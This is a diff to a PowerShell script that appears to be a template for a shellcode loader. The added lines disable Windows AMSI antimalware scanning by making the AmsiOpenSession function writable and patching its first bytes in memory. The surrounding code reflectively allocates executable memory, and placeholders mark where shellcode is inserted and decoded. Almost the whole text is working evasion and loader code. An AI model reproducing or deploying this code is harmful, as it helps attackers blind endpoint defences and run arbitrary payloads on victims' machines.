@@ -38,12 +38,22 @@ function LookupFunc {
 }
 
 
+#Disable AMSI
+[IntPtr]$funcAddr = LookupFunc amsi.dll AmsiOpenSession
+$oldProtectionBuffer = 0
+$vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualProtect), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))
+$vp.Invoke($funcAddr, 3, 0x40, [ref]$oldProtectionBuffer)
+$buf = [Byte[]] (0x48, 0x31, 0xC0) 
+[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $funcAddr, 3)
+$vp.Invoke($funcAddr, 3, 0x20, [ref]$oldProtectionBuffer)
+
 
 #Reflective VirtualAlloc()
 $lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)
 
 
 {SHELLCODE}
+{DECODE}
 
 
 #Copy shellcode to buffer
